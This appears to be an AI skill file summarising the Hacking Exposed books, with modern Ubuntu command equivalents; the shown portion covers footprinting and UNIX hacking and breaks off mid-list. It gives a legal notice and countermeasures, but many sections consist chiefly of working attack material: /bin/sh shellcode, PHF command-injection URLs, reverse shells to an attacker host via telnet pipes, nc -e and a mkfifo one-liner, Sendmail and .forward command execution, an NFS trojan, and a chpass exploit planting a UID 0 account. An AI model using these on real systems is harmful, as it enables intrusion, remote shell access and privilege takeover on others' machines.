---
name: hacking-exposed-reference
description: Reference guide covering network footprinting, UNIX/Linux system hacking, client-side and email attacks, Linux password cracking (John the Ripper, Crack), and Windows 2000/IIS 5 web-application attacks, drawn from the Hacking Exposed book series with modern Ubuntu 24.04 command equivalents for every technique. Use this skill whenever the user asks about WHOIS/DNS recon, UNIX privilege escalation, SUID/rootkit detection, password-hash cracking, Windows SID/RID or SMB/NTLM enumeration, or IIS buffer-overflow and WebDAV attacks, even if they don't mention "Hacking Exposed" by name.
---

# Hacking Exposed: Complete Book Summary & Ubuntu 24.04 Cybersecurity Skills Guide

> **Companion volume:** This is the full *Hacking Exposed* source reference — footprinting, UNIX hacking, client-side attacks, Linux password cracking, Windows 2000 architecture, and IIS 5. A condensed version of this material also appears as Appendix A of the companion *Web Application Hacker's Handbook* master guide.
>
> **Revision note:** This edition adds a linked Table of Contents, a Legal & Ethical Use notice, and a closing Glossary. All original book content, commands, and Ubuntu 24.04 adaptations are unchanged aside from fixing a handful of math-notation rendering artifacts.

### ⚠️ Legal & Ethical Use

This document is a **study and authorized-testing reference only**. Every exploit, script, and command below — including legacy Windows 2000/IIS 5 material retained here for historical and conceptual value — must be used solely against systems you own or are explicitly authorized to test. Unauthorized use against third-party systems is illegal under the Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and equivalent laws elsewhere. Several techniques here (IIS 5, Windows 2000, `Crack 5.0a`) target end-of-life software kept only so you recognize the *pattern* of the bug class — not because the specific exploit works on anything still in production.

### How to Use This Guide

- **Document Overview** below explains exactly which chapters, of which three *Hacking Exposed* books, this reference distills.
- **Parts 1–6** follow the original six chapters, each broken into numbered steps/sections (e.g., `2.4` = Part 2, Section 4) with inline **Book Command** vs. **Ubuntu 24.04 Equivalent** comparisons.
- The closing **Quick-Reference Master Command Matrix** is a single table mapping every book command to its modern Ubuntu 24.04 equivalent — use it for fast lookup without reading a full section.
- **Appendix: Glossary** defines every acronym and technical term used throughout.

---

## Table of Contents

- [Document Overview](#document-overview)
- [Prerequisite: Preparing Your Ubuntu 24.04 LTS Environment](#prerequisite-preparing-your-ubuntu-2404-lts-environment)

**[PART 1: Footprinting](#part-1-footprinting-chapter-1)**
- [1.1 What Is Footprinting & Why Is It Necessary?](#11-what-is-footprinting--why-is-it-necessary)
- [1.2 Step 1: Determine the Scope of Your Activities (OSINT)](#12-step-1-determine-the-scope-of-your-activities-osint)
- [1.3 Step 2: Network Enumeration (whois)](#13-step-2-network-enumeration-whois)
- [1.4 Step 3: DNS Interrogation](#14-step-3-dns-interrogation)
- [1.5 Step 4: Network Reconnaissance (traceroute)](#15-step-4-network-reconnaissance-traceroute)

**[PART 2: Hacking UNIX](#part-2-hacking-unix-chapter-8)**
- [2.1 The Quest for Root & Vulnerability Mapping](#21-the-quest-for-root--vulnerability-mapping)
- [2.2 Remote Access Attacks](#22-remote-access-attacks)
- [2.3 "I Want My Shell": Interactive Shells Behind a Firewall](#23-i-want-my-shell-obtaining-interactive-shells-behind-a-firewall)
- [2.4 Common UNIX Remote Service Attacks](#24-common-unix-remote-service-attacks)
- [2.5 Local Access (Privilege Escalation) Attacks](#25-local-access-privilege-escalation-attacks)
- [2.6 Post-Exploitation: After Hacking Root](#26-post-exploitation-after-hacking-root)

**[PART 3: Hacking the Internet User](#part-3-hacking-the-internet-user-chapter-16)**
- [3.1 Malicious Mobile Code (ActiveX & Java)](#31-malicious-mobile-code-activex--java)
- [3.2 Cookie Snarfing, IE Cross-Domain Frame Exploits, & SSL Fraud](#32-cookie-snarfing-ie-cross-domain-frame-exploits--ssl-fraud)
- [3.3 Email Hacking ("Mail Hacking 101")](#33-email-hacking-mail-hacking-101)

**[PART 4: Linux Password Cracking & Shadow Suite](#part-4-linux-password-cracking--shadow-suite-chapter-9-of-hacking-linux-exposed)**
- [4.1 How Passwords Work in Linux](#41-how-passwords-work-in-linux)
- [4.2 Password Cracking Programs (Crack 5.0a & John the Ripper)](#42-password-cracking-programs-crack-50a--john-the-ripper)
- [4.3 Shadow Passwords (/etc/shadow), Apache, & PAM](#43-shadow-passwords-etcshadow-apache--pam)

**[PART 5: Windows 2000 Security Architecture](#part-5-windows-2000-security-architecture-chapter-2-of-hacking-exposed-windows-2000)**
- [5.1 Core Architecture & Security Principles](#51-core-architecture--security-principles)
- [5.2 SIDs, RIDs, Tokens, & Network Authentication Commands](#52-sids-rids-tokens--network-authentication-commands)

**[PART 6: Hacking IIS 5 and Web Applications](#part-6-hacking-iis-5-and-web-applications-chapter-10-of-hacking-exposed-windows-2000)**
- [6.1 IIS Hacking Basics & Hex URL Encoding](#61-iis-hacking-basics--hex-url-encoding)
- [6.2 IIS 5 Remote Buffer Overflows](#62-iis-5-remote-buffer-overflows)
- [6.3 IIS 5 File System Traversal, File Uploads, & Privilege Escalation](#63-iis-5-file-system-traversal-file-uploads--privilege-escalation)
- [6.4 IIS 5 Source Code Revelation Attacks](#64-iis-5-source-code-revelation-attacks)

**[Quick-Reference Master Command Matrix](#quick-reference-master-command-matrix-for-ubuntu-2404)**
**[Appendix: Glossary of Key Terms](#appendix-glossary-of-key-terms)**

---


## Document Overview
The provided 260-page PDF is an official Osborne/McGraw-Hill compilation spanning six foundational chapters across three books in the *Hacking Exposed* series:
1. **Part I — *Hacking Exposed: Network Security Secrets & Solutions (3rd Edition)*** by Stuart McClure, Joel Scambray, and George Kurtz:
   * **Chapter 1: Footprinting** (Pages 3–28)
   * **Chapter 8: Hacking UNIX** (Pages 29–96 / Book Pages 305–372)
   * **Chapter 16: Hacking the Internet User** (Pages 97–154 / Book Pages 635–692)
2. **Part II — *Hacking Linux Exposed: Linux Security Secrets & Solutions*** by Brian Hatch, James Lee, and George Kurtz:
   * **Chapter 9: Password Cracking** (Pages 155–187 / Book Pages 283–313)
3. **Part III — *Hacking Exposed Windows 2000: Network Security Secrets & Solutions*** by Joel Scambray and Stuart McClure:
   * **Chapter 2: The Windows 2000 Security Architecture from the Hacker's Perspective** (Pages 188–214 / Book Pages 9–33)
   * **Chapter 10: Hacking IIS 5 and Web Applications** (Pages 215–260 / Book Pages 205–249)

---

## Prerequisite: Preparing Your Ubuntu 24.04 LTS Environment
Because the books were written in 2001 (referencing Red Hat 6.2, Solaris 2.6/7, and Windows 2000), several command flags and packages have evolved on **Ubuntu 24.04 LTS (Noble Numbat)**. Run the following command on your Ubuntu 24.04 terminal to install the modern equivalents of the tools used throughout this book:

```bash
sudo apt update && sudo apt install -y \
  wget curl whois dnsutils bind9-host traceroute mtr-tiny \
  nmap netcat-openbsd ncat john libpam-pwquality cracklib-runtime \
  build-essential gcc perl libcrypt-passwdmd5-perl \
  tcpdump dsniff snort tripwire debsums lsof \
  samba-common-bin smbclient impacket-scripts \
  apache2-utils mpack
```

> **Key Ubuntu 24.04 Differences to Keep in Mind:**
> * **`whois` Syntax:** The book uses `whois "query"@server`. On Ubuntu 24.04, use `whois -h server "query"`.
> * **`nslookup` Zone Transfers:** The book uses interactive `nslookup` with `ls -d domain`. Modern BIND `nslookup` on Ubuntu 24.04 removed the `ls` command; use `dig @server domain axfr` or `host -l domain server` instead.
> * **`netcat` (`nc`) `-e` Flag:** Ubuntu 24.04 ships with `netcat-openbsd` by default, which disables the `-e` (execute) flag for security. To use `-e` as shown in the book, use `ncat` (from the `ncat` package) or a named pipe (`mkfifo`).

---

## PART 1: Footprinting (Chapter 1)

### 1.1 What Is Footprinting & Why Is It Necessary?
Footprinting is the structured reconnaissance process of gathering target information to create a complete profile of an organization's security posture across four environments:
1. **Internet:** Domain names, network blocks, reachable IP addresses, TCP/UDP services, system architecture (e.g., SPARC vs. x86), ACLs, IDSs, and system enumeration (banners, routing tables, SNMP).
2. **Intranet:** Networking protocols (IP, IPX, DecNET), internal domain names, internal network blocks, and internal services.
3. **Remote Access:** Analog/digital phone numbers, remote system types, authentication mechanisms, and VPNs (IPSec, PPTP).
4. **Extranet:** Connection origination/destination, connection type, and access control mechanisms.

---

### 1.2 Step 1: Determine the Scope of Your Activities (OSINT)
* **Web Page & HTML Source Analysis:** Review the target's website for physical locations, acquisitions/mergers, phone numbers, contact emails, security policies, and hidden HTML comments (`<!-- ... -->`).
* **Mirroring Websites for Offline Analysis:** Download the entire site locally to search through source code programmatically.
* **Search Engine Directives:** Use advanced boolean and search engine directives to find rogue websites linking back to the target (`link:`) or specific keywords on the target host (`host:` or `site:`).
* **SEC EDGAR Database (`www.sec.gov`):** For publicly traded companies, review **10-Q** (quarterly) and **10-K** (annual) filings for keywords like `"subsidiary"` or `"subsequent events"`. Newly acquired companies are often hastily connected to the parent corporate network with weak security ("leapfrogging").

#### Book Commands & Ubuntu 24.04 Equivalents (Step 1)
```bash
# Mirror an entire website for offline footprinting (Ubuntu 24.04)
wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://www.example.com

# Search downloaded HTML files for hidden developer comments (<!--)
grep -rn "<!--" ./www.example.com/

# Search Engine Directives (AltaVista syntax from book vs. Modern Google/DuckDuckGo syntax)
# Book (AltaVista):
#   link:www.l0pht.com and hacking
#   host:www.l0pht.com and mudge
# Modern Search Engine Equivalent:
#   site:example.com "admin" OR "password"
```

* **Countermeasure:** Follow RFC 2196 (*Site Security Handbook*) guidelines and scrub sensitive configuration details, comments, and unnecessary contact data from public web pages.

---

### 1.3 Step 2: Network Enumeration (`whois`)
Network enumeration identifies domain names and IP netblocks associated with the target via five types of `whois` queries:
1. **Registrar Query:** Queries `whois.crsnic.net` using a trailing dot wildcard (`acme.`) to find all matching domains and their accredited registrar.
2. **Organizational Query:** Uses the `name` keyword against a registrar to list all domains registered to a company name.
3. **Domain Query:** Retrieves registrant address, Administrative/Technical/Zone contacts (names, emails, voice/fax phone numbers used for wardialing and social engineering), creation/update dates, and authoritative DNS servers.
4. **Network Query (ARIN):** Queries `whois.arin.net` (or RIPE, APNIC, `.mil`, `.gov`) to discover ASN numbers and CIDR netblocks owned by the company vs. hosted by an ISP.
5. **Point of Contact (POC) Query:** Queries by database handle (e.g., `HANDLE WB9201`) or `@domain.com` to discover other domains managed by the same administrator or a list of employee emails/phone numbers.

#### Book Commands & Ubuntu 24.04 Equivalents (Step 2)
```bash
# 1. Registrar Query (Wildcard search using trailing '.')
# Book Command:
whois "acme."@whois.crsnic.net
whois "acme.net"@whois.crsnic.net
# Ubuntu 24.04 Command:
whois -h whois.crsnic.net "acme."
whois -h whois.crsnic.net "acme.net"

# 2. Organizational Query
# Book Command:
whois "name Acme Networks"@whois.networksolutions.com
# Ubuntu 24.04 Command:
whois -h whois.networksolutions.com "name Acme Networks"

# 3. Domain Query
# Book Command:
whois acme.net@whois.networksolutions.com
# Ubuntu 24.04 Command:
whois -h whois.networksolutions.com acme.net

# 4. Discovering all domains for which a DNS server is authoritative (HST record tip)
# Book Commands:
whois "HOST 10.10.10.1"@whois.networksolutions.com
whois "SERVER NS9999-HST"@whois.networksolutions.com
# Ubuntu 24.04 Commands:
whois -h whois.networksolutions.com "HOST 10.10.10.1"
whois -h whois.networksolutions.com "SERVER NS9999-HST"

# 5. Network / ARIN Netblock Queries
# Book Commands:
whois "Acme Net."@whois.arin.net
whois 10.10.10.0@whois.arin.net
# Ubuntu 24.04 Commands:
whois -h whois.arin.net "n + Acme Net*"
whois -h whois.arin.net 10.10.10.0

# 6. Point of Contact (POC) & Email Enumeration Queries
# Book Commands:
whois "HANDLE WB9201"@whois.networksolutions.com
whois "@acme.net"@whois.networksolutions.net
# Ubuntu 24.04 Commands:
whois -h whois.networksolutions.com "HANDLE WB9201"
whois -h whois.networksolutions.com "@acme.net"
```

* **Countermeasure:** Keep WHOIS records updated when admins leave; use toll-free numbers outside the corporate PBX exchange to defeat wardialers; plant a fictitious "honeypot" administrative contact name to detect social engineering attempts; and never use insecure `FROM` email authentication for domain registrar updates (use strong passwords/PGP/2FA to prevent domain hijacking like the 1998 AOL incident).

---

### 1.4 Step 3: DNS Interrogation
Misconfigured DNS servers allow untrusted Internet users to perform **Zone Transfers (AXFR)** over TCP port 53, dumping the entire zone file. If an organization fails to separate external (public) DNS from internal (private) DNS (split-horizon DNS), attackers get a complete blueprint of internal hosts.
* **`A` Records:** Map hostnames to IP addresses.
* **`HINFO` Records (RFC 952):** Identify the CPU architecture and OS (e.g., `"SPARC" "Solaris"` or `"Gateway2000" "WinWKGRPS"`).
* **`MX` Records:** Identify Mail Exchange servers, which frequently reside on the same perimeter network or host as the corporate firewall.

#### Book Commands & Ubuntu 24.04 Equivalents (Step 3)
```bash
# 1. Manual Zone Transfer via nslookup (Book Method)
nslookup
> server 10.10.10.2
> set type=any
> ls -d Acme.net. >> /tmp/zone_out

# Ubuntu 24.04 Equivalent for Zone Transfer (since modern nslookup deprecated 'ls -d'):
dig @10.10.10.2 Acme.net axfr > /tmp/zone_out

# 2. Slicing & Dicing Zone Transfer Output for High-Value Targets
more /tmp/zone_out
grep -i solaris /tmp/zone_out | wc -l    # Count Solaris targets
grep -i test /tmp/zone_out | wc -l       # Count test systems (often poorly secured)

# 3. Zone Transfers & IP Extraction using 'host' (Works natively on Ubuntu 24.04)
host -l Acme.net
host -l -v -t any Acme.net
# Extract only IP addresses (4th field separated by space) into a target file:
host -l acme.net | cut -f 4 -d" " > /tmp/ip_out

# 4. Recursive Zone Transfer using 'axfr' tool (Book)
axfr Acme.net
axfrcat Acme.net

# 5. Enumerating Mail Exchange (MX) and A Records
host Acme.net
```

* **Countermeasure:**
  * Restrict zone transfers in BIND (`named.conf`) using the `allow-transfer { 10.10.10.2; };` directive or cryptographic Transaction Signatures (**TSIG**).
  * Block unauthorized inbound TCP port 53 at the perimeter firewall (note: RFC states DNS queries > 512 bytes use TCP, though normal lookups use UDP 53).
  * Implement split-horizon DNS so external nameservers only know about public hosts, and remove all `HINFO` records.

---

### 1.5 Step 4: Network Reconnaissance (`traceroute`)
`traceroute` maps network topology and identifies access control devices (routers and firewalls) by sending packets with incrementing IP Time-To-Live (TTL) values, eliciting ICMP `TIME_EXCEEDED` messages from each hop.
* **UNIX `traceroute` vs. Windows `tracert`:** UNIX defaults to **UDP** packets (and supports ICMP via `-I`), whereas Windows `tracert` defaults to **ICMP Echo Request** packets.
* **Bypassing Firewalls during Reconnaissance:** By default, `traceroute -p n` increments the destination UDP port with each probe. Michael Schiffman's `-S` patch (and modern Ubuntu `traceroute -U`) locks the destination port to a fixed port like **UDP 53 (DNS)** so firewalls let the probes pass right through to internal hosts.

#### Book Commands & Ubuntu 24.04 Equivalents (Step 4)
```bash
# 1. Standard UDP traceroute
traceroute Acme.net
traceroute 10.10.10.2

# 2. ICMP traceroute (-I) and Loose Source Routing (-g)
sudo traceroute -I Acme.net
traceroute -g 10.10.12.13 Acme.net

# 3. Bypassing Firewall ACLs using a Fixed Destination Port (UDP 53 - DNS)
# Book Command (using Michael Schiffman's firewalk patch for traceroute 1.4a5):
traceroute -S -p53 10.10.10.2

# Ubuntu 24.04 Native Equivalents (Fixed port UDP 53 or TCP 53/80):
sudo traceroute -U -p 53 10.10.10.2
sudo nmap -Pn --traceroute -sU -p 53 10.10.10.2
```

* **Countermeasure:** Monitor for reconnaissance with **Snort** (`www.snort.org`), spoof/log incoming traceroutes using **RotoRouter**, and restrict inbound ICMP/UDP at border routers.

---

## PART 2: Hacking UNIX (Chapter 8)

### 2.1 The Quest for Root & Vulnerability Mapping
In UNIX, there are two privilege levels: `root` (UID `0`) and everything else. Before exploiting a system, attackers perform **Vulnerability Mapping**—correlating open ports, service banners (e.g., Apache 1.3.9, Sendmail 8.9.10), OS architecture, and usernames against Bugtraq, CERT advisories, and scanners like **Nessus** or **SAINT**.

### 2.2 Remote Access Attacks
Remote compromise of a UNIX system occurs via one of three primary methods:
1. **Exploiting a listening TCP/UDP service** (if it isn't listening, it can't be exploited remotely).
2. **Routing through a UNIX system** (e.g., source-routing packets through a UNIX firewall that accidentally has kernel IP forwarding enabled).
3. **User-initiated remote execution** (e.g., an admin browsing a malicious site as `root` or running a vulnerable packet sniffer like `snoop`).

#### A. Brute Force Attacks
Guessing username/password pairs (especially **"Joe" accounts**, where username = password) against `telnet`, `ftp`, `rlogin`, `rsh`, `ssh`, `snmp`, `pop`, and `http/https`.
* **Book Tools:** `Brutus`, `brute_web.c`, `pop.c`, `middlefinger`, `TeeNet`.
* **Countermeasures:** Enforce minimum 8-character passwords, password aging (30 days privileged / 60 days normal), account lockouts, **S/Key**, **OPIE**, **Cracklib**, **Npasswd**, **Secure Remote Password (SRP)**, and **SSH**.

#### B. Data-Driven Attacks: Buffer Overflows
Popularized by Aleph One's *Phrack 49* article ("Smashing the Stack for Fun and Profit"), stack buffer overflows occur when unbounded C functions (`strcpy()`, `strcat()`, `sprintf()`) write past a fixed-length array on the stack, overwriting the function's return address to point to attacker-supplied assembly code (**the egg / shellcode**) that executes `/bin/sh` with the privileges of the daemon (often `root`).

```bash
# Book Command: Testing Sendmail VRFY for a Buffer Overflow using Perl and Netcat
echo "vrfy `perl -e 'print "a" x 1000'`" | nc www.targetsystem.com 25
```

```c
/* Book Linux x86 Shellcode (Egg) that spawns /bin/sh */
char shellcode[] =
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";
```

* **Countermeasures:**
  * Replace unsafe C functions with bounded functions (`fgets()`, `strncpy()`, `strncat()`).
  * Use compiler/library protections like **StackGuard** and **Libsafe**, and wrap services with **TCP Wrappers (`tcpd`)** or **`xinetd`**, plus kernel packet filters (`ipchains`/`netfilter`/`nftables` on Linux, `ipf` on BSD).
  * **Disable Stack Execution:** Use Solar Designer's Openwall patch on Linux 2.0/2.2 (modern Ubuntu 24.04 enables NX/DEP and ASLR by default in the kernel). On Solaris 2.6/7, add to `/etc/system`:
    ```ini
    set noexec_user_stack=1
    set noexec_user_stack_log=1
    ```
  * *Note:* Disabling stack execution does not stop **heap-based overflows** (overrunning dynamically allocated `malloc()` memory).

#### C. Data-Driven Attacks: Input Validation Attacks
Occurs when a script or program fails to strip UNIX shell metacharacters (`\ / < > ! $ % ^ & * | { } [ ] " ' ~ ;`) or newline characters (`%0a`), allowing attackers to "escape out" to a shell.

```http
# Classic PHF CGI Input Validation Exploit (Book)
/cgi-bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd
```

---

### 2.3 "I Want My Shell": Obtaining Interactive Shells Behind a Firewall
When a target web server sits behind a firewall that only allows inbound TCP ports 80 and 443, attackers cannot connect inbound to `telnet` or `ssh`. Instead, they use remote command execution (such as `phf`) to spawn a **Back Channel** (reverse shell) originating outbound from the target server back to the attacker.

#### Method 1: Operation X (Reverse `xterm`)
Directs an X11 `xterm` client from the victim server back to the attacker's X server (TCP port 6000). The `-ut` flag disables `utmp` login logging.
```http
# Book Exploit Payload via PHF:
/cgi-bin/phf?Qalias=x%0a/usr/X11R6/bin/xterm%20-ut%20-display%20evil_hackers_IP:0.0
```

#### Method 2: Reverse Telnet (Two-Window Pipe Trick)
When X11 is not installed and `nc` is not on the target, standard `/bin/telnet` can be piped into `/bin/sh` and piped out to a second `/bin/telnet` session using two ports typically allowed outbound through firewalls (TCP 80 and TCP 25):
```bash
# Step 1 (Attacker - Ubuntu 24.04): Open two Netcat listeners in separate terminals
sudo nc -l -n -v -p 80    # Window 1: Where you type commands
sudo nc -l -n -v -p 25    # Window 2: Where command output is displayed

# Step 2 (Victim Server): Execute the Reverse Telnet pipe
/bin/telnet evil_hackers_IP 80 | /bin/sh | /bin/telnet evil_hackers_IP 25

# URL-Encoded Version via PHF:
/cgi-bin/phf?Qalias=x%0a/bin/telnet%20evil_hackers_IP%2080%20|%20/bin/sh%20|%20/bin/telnet%20evil_hackers_IP%2025
```

#### Method 3: Netcat (`nc`) Back Channel ("Shoveling a Shell")
If `nc` is compiled with `#define GAPING_SECURITY_HOLE` (supporting `-e`):
```bash
# Step 1 (Attacker): Start Netcat listener on port 80
sudo nc -l -n -v -p 80

# Step 2 (Victim - Book Command): Shovel /bin/sh back to attacker
nc -e /bin/sh evil_hackers_IP 80
# URL-Encoded via PHF:
/cgi-bin/phf?Qalias=x%0a/bin/nc%20-e%20/bin/sh%20evil_hackers_IP%2080

# Ubuntu 24.04 Equivalents (since netcat-openbsd lacks '-e'):
ncat -e /bin/sh evil_hackers_IP 80
# Or using a POSIX named pipe (works with Ubuntu's default nc):
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc evil_hackers_IP 80 > /tmp/f
```
* **Countermeasures:** Remove X11 from servers; restrict execution permissions on outbound client binaries (`chmod 750 /usr/bin/telnet`) so the `nobody` web user cannot execute them; and block unauthorized outbound connections at the firewall/proxy.

---

### 2.4 Common UNIX Remote Service Attacks

#### 1. TFTP (UDP Port 69)
Unauthenticated protocol used to boot diskless workstations and routers. Misconfigured TFTP servers allow attackers to download `/etc/passwd` or router configurations (`<router_hostname>.cfg` from `/tftpboot`) containing router passwords and SNMP community strings.
* **Countermeasure:** Restrict TFTP strictly to `/tftpboot`, wrap with TCP Wrappers/firewall rules, or disable it.

#### 2. FTP (`wu-ftpd` 2.6.0 `SITE EXEC` Format String Vulnerability)
Aside from anonymous FTP directory traversal and world-writable directories (used to plant `.rhosts` files), `wu-ftpd 2.6.0` and earlier suffer from an input validation / format string bug (`%f`, `%p`, `%n`) in the `SITE EXEC` feature that grants instant `root` shell access even with anonymous login:
```bash
# Book Command: Exploiting RedHat 6.2 wu-ftpd 2.6.0
wugod -t 192.168.1.10 -s0
```

#### 3. Sendmail (TCP Port 25)
* **Sendmail 4.1 Pipe Exploit:** Allowed piping commands directly in the `rcpt to:` field to execute as `bin`:
  ```text
  helo
  mail from: |
  rcpt to: bounce
  data
  .
  mail from: bin
  rcpt to: | sed '1,/^$/d' | sh
  data
  ```
* **Abusing `~/.forward` Files:** If a user's home directory is writable (via FTP or NFS), an attacker can upload a malicious `.forward` file and email the victim to trigger command execution under the victim's UID:
  ```bash
  # Step 1: Create the malicious .forward file
  cat > .forward
  |"cp /bin/sh /home/gk/evil_shell ; chmod 755 /home/gk/evil_shell"
  # (Press Ctrl+D)

  # Step 2: Upload .forward to victim's home directory and send an email trigger
  echo hello chump | mail gk@targetsystem.com
  ```
* **Countermeasures:** Upgrade Sendmail, remove the `decode` alias from `/etc/aliases`, use TIS toolkit's `smap`/`smapd` wrapper, or switch to `qmail`/`postfix`.

#### 4. Remote Procedure Call (RPC) Services (Port 111 / High Ports)
RPC services register with `portmapper`/`rpcbind` on port 111. Services like `rpc.ttdbserverd` (ToolTalk), `rpc.cmsd` (Calendar Manager), `rpc.statd`, and `mountd` run as `root` and are notorious for buffer overflows. Even if port 111 is firewalled, attackers scan high ports directly with `nmap -sR` (or `nmap -sV` on Ubuntu 24.04).
```bash
# Book Script (cmsd.sh): Exploiting Solaris rpc.cmsd to pop a root xterm
#!/bin/sh
if [ $# -lt 4 ]; then
  echo "Rpc.cmsd buffer overflow for Solaris 2.5 & 2.6 7"
  echo "If rpcinfo -p target_ip | grep 100068 = true you win!"
  echo "Don't forget to xhost + the target system"
  echo "Usage: $0 target_hostname target_ip <O/S version (1-7)> your_ip"
  exit 1
fi
echo "Executing exploit..."
cmsd -h $1 -c "/usr/openwin/bin/xterm -display $4:0.0 &" $3 $2

# Execution:
cmsd.sh quake 192.168.1.11 2 192.168.1.103
```

#### 5. Network File System (NFS - TCP/UDP Port 2049)
When `/etc/exports` (or `/etc/dfs/dfstab`) exports `/` or `/usr` to `(everyone)`, attackers can mount the filesystem remotely. Even if `root` (UID `0`) is squashed to UID `-2` (`nobody`), attackers can use Leendert van Doorn's **`nfsshell` (`nfs`)** to switch their effective UID/GID to `2` (`bin`), overwrite `/sbin/in.ftpd` with a script that launches a root `xterm`, and connect via `ftp` to trigger `inetd` as `root`.
```bash
# Step 1: Enumerate RPC services and exported NFS shares (Ubuntu 24.04)
rpcinfo -p quake
showmount -e quake

# Step 2: Standard OS mount
sudo mount quake:/ /mnt

# Step 3: Interactive exploitation using 'nfsshell' (nfs)
nfs
nfs> host quake
nfs> export
nfs> mount /
nfs> status
nfs> cd /etc
nfs> cat passwd
# Notice UID 2 is 'bin', which owns system binaries. Remount /usr as UID/GID 2:
nfs> mount /usr
nfs> uid 2
nfs> gid 2
nfs> status

# Step 4: Create a Trojan in.ftpd script locally on attacker machine:
cat << 'EOF' > in.ftpd
#!/bin/sh
/usr/openwin/bin/xterm -display 10.10.10.10:0.0 &
EOF

# Step 5: Upload Trojan in.ftpd over NFS and trigger it via FTP
nfs> cd /sbin
nfs> put in.ftpd
xhost +quake
ftp quake
```

#### 6. X Window System Insecurities (TCP Ports 6000–6063)
When admins lazily run `xhost +` (allowing any IP to connect to their X display), attackers can log keystrokes, view application windows remotely, dump screenshots, or inject keystrokes:
```bash
# 1. Scan for open X servers and log all console keystrokes in real time
xscan quake
tail -f KEYLOG.quake:0.0

# 2. List open Window hex IDs on the target X display and watch a window live
xlswins -display quake:0.0 | grep -i netscape
xwatchwin quake -w 0x1000561

# 3. Dump a screenshot of the root X display and view it locally
xwd -root -display localhost:0.0 > dump.xwd
xwud -in dump.xwd

# 4. Countermeasure: Immediately revoke public Xhost access
xhost -
```
* **Countermeasures:** Never use `xhost +`; use `MIT-MAGIC-COOKIE-1` or `SSH` X11 tunneling (`ForwardX11 yes` in `/etc/ssh/sshd_config`), and block ports 6000–6063.

#### 7. DNS / BIND (`named`) NXT Record Buffer Overflow
BIND 8.2, 8.2.1, and 8.2.2 are vulnerable to a remote `root` buffer overflow when validating malicious `NXT` records (`CA-99-14-bind`).
```bash
# Step 1: Fingerprint the remote BIND version via CHAOS TXT query (Ubuntu 24.04)
dig @10.1.1.100 version.bind chaos txt

# Step 2: Attacker delegates a subdomain ('hash.attackers.org') to their exploit box:
# In /var/named/attackers.org.zone:
# subdomain IN NS hash.attackers.org.

# Step 3: Run the ADM NXT exploit listener on UDP port 53 (RedHat 6.x = option 1)
./adm-nxt 1

# Step 4: Force the victim DNS server (10.1.1.100) to query the rogue DNS server
nslookup
> server 10.1.1.100
> hash.attackers.org
```
* **Countermeasure:** Upgrade BIND and run `named` as an unprivileged user inside a `chroot()` jail:
  ```bash
  named -u dns -g dns -t /home/dns
  ```

---

### 2.5 Local Access (Privilege Escalation) Attacks

#### 1. Local Buffer Overflows (`libc` `LC_MESSAGES`)
Any SUID-root binary dynamically linked to a vulnerable `libc` (such as Solaris 2.6/7 `LC_MESSAGES` environment variable overflow) can be exploited locally to spawn a root shell:
```bash
gcc ex_lobc.c -o ex_lobc
./ex_lobc
```

#### 2. Symbolic Link (Symlink) Attacks
SUID-root programs that create temporary files in `/tmp` or `/var` without checking if the file already exists (`O_CREAT | O_EXCL`) will blindly follow a symbolic link (`ln -s`) and overwrite or `chown` critical system files like `/etc/passwd`.
```bash
# Basic symlink syntax
ln -s /tmp/foo /etc/passwd

# Real-world Solaris CDE 'dtappgather' Symlink Exploit (chowns target to attacker's UID)
ls -l /etc/passwd
ln -s /etc/passwd /var/dt/appconfig/appmanager/generic-display-0
/usr/dt/bin/dtappgather
ls -l /etc/passwd

# Auditing binaries in /bin or /usr/sbin for temporary file creation
strings * | grep tmp
```

#### 3. File Descriptor Attacks (`chpass` on OpenBSD 2.3)
When `chpass` opens a temporary password file with read/write (`O_RDWR`) file descriptors and invokes `vi` without setting the `close-on-exec` flag, shelling out of `vi` (`:!sh`) passes the open file descriptor to the child shell, allowing a C program to inject a `UID 0` account directly into `/etc/master.passwd`:
```bash
export EDITOR=vi
/usr/bin/chpass
# Inside vi, type :!sh to spawn a shell inheriting the open file descriptor, then run:
nohup ./chpass &
exit
# Exit vi (:q) and switch to the newly injected root account:
su owned
id
```
```c
/* Mark Zielinski's File Descriptor Exploit (chpass.c) */
int main () {
  FILE *f;
  int count;
  f = fdopen (FDTOUSE, "a");
  for (count = 0; count != 30000; count++)
    fprintf (f, "owned::0:0:0:0:OWNED,,,:/tmp:/bin/bash\n");
  exit(0);
}
```

#### 4. Race Conditions & Signal Handling (`wu-ftpd` v2.4)
Processes handling asynchronous signals (`SIGPIPE`, `SIGURG`, `SIGTSTP`) can be interrupted during a brief privileged window ("winning the race"). In `wu-ftpd` 2.4, closing a data connection sends `SIGPIPE`, causing the daemon to raise its effective UID to `0` (`root`) inside `dologout()`. Sending `SIGURG` (via the FTP `ABOR` command) right at that moment interrupts logout and returns execution to the main FTP command loop while still running as `UID 0`.

#### 5. Core-File Manipulation
Crashing a SUID process (like older `FTPD` via the `PASV` command before login) can dump a world-readable `core` file containing cached `/etc/shadow` password hashes from memory.
```bash
# Countermeasure: Disable core file generation using ulimit (Ubuntu 24.04)
ulimit -a
ulimit -c 0
```

#### 6. Shared Libraries (`LD_PRELOAD`) & Kernel Flaws
* **`LD_PRELOAD`:** Older `in.telnetd` implementations allowed passing `LD_PRELOAD` environment variables during login, hijacking `/bin/login` library calls with a Trojan shared library.
* **Linux Kernel Flaws:** Linux 2.2.x kernels prior to 2.2.16 had a flaw in POSIX capabilities that prevented SUID programs like `sendmail` from dropping root privileges cleanly.

#### 7. System Misconfiguration: SUID/SGID & World-Writable Files
```bash
# 1. Find all SUID-root files on the system (Ubuntu 24.04)
sudo find / -type f -perm -04000 -ls 2>/dev/null

# 2. Find all SGID files on the system (Ubuntu 24.04)
sudo find / -type f -perm -02000 -ls 2>/dev/null

# 3. Find all World-Writable files on the system
sudo find / -perm -2 -type f -print 2>/dev/null

# 4. Book Exploit: Backdooring a world-writable startup script (/etc/rc.d/rc3.d/S99local)
